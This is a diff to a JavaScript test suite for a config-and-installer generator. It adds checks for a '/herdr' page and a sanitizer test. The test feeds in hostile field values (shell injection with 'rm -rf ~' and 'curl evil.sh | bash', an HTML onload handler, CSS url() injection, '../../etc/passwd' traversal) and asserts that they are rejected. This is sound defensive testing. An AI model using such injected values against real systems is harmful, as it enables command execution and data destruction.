@@ -85,7 +85,7 @@ function bashCheck(src, label) {
   // Every page, not just two: the nav is stamped into all of them from one registry,
   // so a page missing from this loop is a page whose chrome nobody checks.
   const { PAGES } = require(path.join(ROOT, 'api/_nav.js'));
-  for (const p of ['/', '/customize', '/cmux']) {
+  for (const p of PAGES.map(x => x.path)) {
     const r = await call(p);
     ok(r.status === 200, 'GET ' + p + ' → 200');
     ok(!r.body.includes('${'), p + ' has no unresolved ${} leftovers');
@@ -959,6 +959,50 @@ function bashCheck(src, label) {
     '/cmux: the comparison sits below the preview');
   // A wide table must scroll in its own box rather than sending the page sideways.
   ok(cmPage.includes('cmptablewrap'), '/cmux: the comparison table scrolls in its own box');
+
+  // ── /herdr ────────────────────────────────────────────────────────────────
+  const hdPage = (await call('/herdr')).body;
+  const HD = require(path.join(ROOT, 'api/_herdr.js'));
+  ok(hdPage.includes('id="compare"'), '/herdr: has the comparison block');
+  ok(/class="cmpcard here"[\s\S]{0,400}herdr/.test(hdPage), '/herdr: comparison marks herdr');
+  ok(hdPage.indexOf('id="pair"') < hdPage.indexOf('id="compare"'),
+    '/herdr: the comparison sits below the preview');
+  ok(hdPage.includes('id="dockgrip"') && hdPage.includes('id="pinbtn"'),
+    '/herdr: the preview pins and resizes like the others');
+  for (const p of HD.HERDR_PLUGINS) ok(hdPage.includes(p.repo), '/herdr: lists plugin ' + p.repo);
+  ok(hdPage.includes('saneHerdr'), '/herdr: sanitizes the payload before rendering it');
+
+  // A ?c= link is attacker-controlled and several herdr values land inside style="" and
+  // class="". The server sanitizer is the backstop for the FILE; these pin the values it
+  // refuses, since a bad one would otherwise be written to a real config.
+  const evilHd = HD.sanitizeHerdr({
+    on: true,
+    theme: 'nord"; rm -rf ~; #',
+    accentColor: 'red;background:url(//x)',
+    toastPosition: 'bottom-right" onload="alert(1)',
+    worktreeDir: '~/x"; curl evil.sh | bash; #',
+    prefix: 'ctrl+b" evil',
+    sidebarWidth: 1e9,
+    plugins: ['reviewr', '../../etc/passwd', 'owner/repo'],
+  });
+  ok(evilHd.theme === HD.HERDR_DEFAULTS.theme, 'herdr: a bogus theme falls back');
+  ok(evilHd.accentColor === HD.HERDR_DEFAULTS.accentColor, 'herdr: a non-hex accent falls back');
+  ok(evilHd.toastPosition === HD.HERDR_DEFAULTS.toastPosition, 'herdr: a bogus toast position falls back');
+  ok(evilHd.worktreeDir === HD.HERDR_DEFAULTS.worktreeDir, 'herdr: a path with shell metacharacters falls back');
+  ok(evilHd.prefix === HD.HERDR_DEFAULTS.prefix, 'herdr: a bogus prefix falls back');
+  ok(evilHd.sidebarWidth <= 36, 'herdr: sidebar width is clamped');
+  ok(evilHd.plugins.length === 1 && evilHd.plugins[0] === 'reviewr',
+    'herdr: only allowlisted plugin ids survive');
+  const evilToml = HD.buildHerdrToml(evilHd);
+  ok(!/rm -rf|curl |alert\(|url\(/.test(evilToml), 'herdr: none of that reaches the TOML');
+  // The generated installer has to be valid bash even from a hostile payload.
+  bashCheck('#!/bin/bash\nset -euo pipefail\n' + HD.herdrApplyBlock(evilHd), 'herdr_apply_hostile');
+  // herdr documents ~/.config and HERDR_CONFIG_PATH; it never claims XDG support, so
+  // writing to $XDG_CONFIG_HOME would miss the file herdr actually reads.
+  // The expansion, not the word — the comment above the line explains why XDG is not
+  // used, and a bare substring match would flag that explanation as the bug.
+  ok(!/\$\{XDG_CONFIG_HOME/.test(HD.herdrApplyBlock(evilHd)),
+    'herdr: the installer targets the documented config path');
 
   // Naming a saved setup must not go through prompt(): the browser counts every second
   // that a modal is open as time the click handler blocked the main thread, so naming one
